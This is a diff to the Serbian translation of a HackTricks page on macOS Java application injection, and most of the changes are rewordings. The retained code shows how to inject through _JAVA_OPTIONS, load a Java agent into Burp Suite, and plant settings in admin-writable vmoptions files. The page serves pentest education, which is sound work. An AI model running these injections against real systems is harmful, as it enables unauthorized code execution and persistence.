@@ -1,10 +1,10 @@
-# macOS Java aplikacije injekcija
+# Injekcija u Java aplikacije na macOS-u
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Enumeracija
 
-Pronađite Java aplikacije instalirane na vašem sistemu. Primećeno je da Java aplikacije u **Info.plist** sadrže neke java parametre koji sadrže string **`java.`**, tako da možete pretraživati za tim:
+Pronađite Java aplikacije instalirane na sistemu. Primećeno je da će Java aplikacije u datoteci **Info.plist** sadržati određene Java parametre koji sadrže string **`java.`**, pa ih možete pretražiti:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Promenljiva okruženja **`_JAVA_OPTIONS`** može se koristiti za ubrizgavanje proizvoljnih java parametara u izvršavanje java kompajlirane aplikacije:
+Promenljiva okruženja **`_JAVA_OPTIONS`** može se koristiti za ubacivanje proizvoljnih Java parametara tokom izvršavanja Java-kompajlirane aplikacije:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Da biste to izvršili kao novi proces, a ne kao dete trenutnog terminala, možete koristiti:
+Da biste ga izvršili kao novi proces, a ne kao child trenutnog terminala, možete koristiti:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Međutim, to će izazvati grešku na izvršnoj aplikaciji, drugi, suptilniji način je da se kreira java agent i koristi:
+Međutim, to će izazvati grešku u pokrenutoj aplikaciji; drugi, prikriveniji način je da kreirate Java agent i upotrebite:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,7 +83,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Kreiranje agenta sa **drugom verzijom Jave** od aplikacije može uzrokovati pad izvršavanja i agenta i aplikacije
+> Kreiranje agenta sa **drugom verzijom Java-e** od one koju koristi aplikacija može izazvati pad izvršavanja i agenta i aplikacije
 
 Gde agent može biti:
 ```java:Agent.java
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-Da biste kompajlirali agenta, pokrenite:
+Za kompajliranje agenta pokrenite:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-I zatim izvezite env promenljivu i pokrenite java aplikaciju kao:
+Zatim exportujte env promenljivu i pokrenite java aplikaciju ovako:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions datoteka
+## vmoptions fajl
 
-Ova datoteka podržava specifikaciju **Java parametara** kada se Java izvršava. Možete koristiti neke od prethodnih trikova da promenite java parametre i **naterate proces da izvrši proizvoljne komande**.\
-Štaviše, ova datoteka može takođe **uključivati druge** sa `include` direktorijumom, tako da možete promeniti i uključenu datoteku.
+Ovaj fajl podržava specifikaciju **Java parametara** kada se Java izvršava. Možete koristiti neke od prethodnih trikova za izmenu Java parametara i **navođenje procesa da izvrši proizvoljne komande**.\
+Pored toga, ovaj fajl može takođe da **uključuje druge fajlove** pomoću `include` direktorijuma, tako da možete izmeniti i uključeni fajl.
 
-Još više, neke Java aplikacije će **učitati više od jedne `vmoptions`** datoteke.
+Štaviše, neke Java aplikacije će **učitati više od jednog `vmoptions`** fajla.
 
-Neke aplikacije kao što je Android Studio ukazuju u svom **izlazu gde traže** ove datoteke, kao:
+Neke aplikacije, kao što je Android Studio, u svom **izlazu navode gde traže** ove fajlove, na primer:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Napomena kako je zanimljivo da Android Studio u ovom primeru pokušava da učita datoteku **`/Applications/Android Studio.app.vmoptions`**, mesto gde svaki korisnik iz **`admin` grupe ima pristup za pisanje.** 
+Imajte na umu koliko je zanimljivo da Android Studio u ovom primeru pokušava da učita fajl **`/Applications/Android Studio.app.vmoptions`**, lokaciju kojoj svaki korisnik iz grupe **`admin` ima pristup za upis.**
 
 {{#include ../../../banners/hacktricks-training.md}}
